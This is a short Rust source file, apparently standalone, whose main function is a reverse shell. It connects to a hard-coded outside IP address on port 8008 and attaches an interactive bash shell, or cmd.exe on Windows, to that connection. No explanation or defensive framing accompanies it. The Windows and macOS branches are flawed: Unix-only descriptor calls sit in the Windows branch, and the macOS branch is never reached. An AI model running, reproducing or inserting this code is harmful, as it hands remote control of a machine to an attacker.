use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn main() {
    if cfg!(unix) {
        let x = TcpStream::connect("150.136.245.71:8008").unwrap();
        let o = x.as_raw_fd();
        Command::new("/bin/bash")
            .arg("-i")
            .stdin(unsafe { Stdio::from_raw_fd(o) })
            .stdout(unsafe { Stdio::from_raw_fd(o) })
            .stderr(unsafe { Stdio::from_raw_fd(o) })
            .spawn()
            .unwrap()
            .wait()
            .unwrap();
    } else if cfg!(windows) {
        let x = TcpStream::connect("150.136.245.71:8008").unwrap();
        let o = x.as_raw_fd();
        Command::new("C:\\Windows\\System32\\cmd.exe")
            .stdin(unsafe { Stdio::from_raw_fd(o) })
            .stdout(unsafe { Stdio::from_raw_fd(o) })
            .stderr(unsafe { Stdio::from_raw_fd(o) })
            .spawn()
            .unwrap()
            .wait()
            .unwrap();
    } else if cfg!(target_os = "macos") {
        let x = TcpStream::connect("150.136.245.71:8008").unwrap();
        let o = x.as_raw_fd();
        Command::new("/bin/bash")
            .arg("-i")
            .stdin(unsafe { Stdio::from_raw_fd(o) })
            .stdout(unsafe { Stdio::from_raw_fd(o) })
            .stderr(unsafe { Stdio::from_raw_fd(o) })
            .spawn()
            .unwrap()
            .wait()
            .unwrap();
    }
}
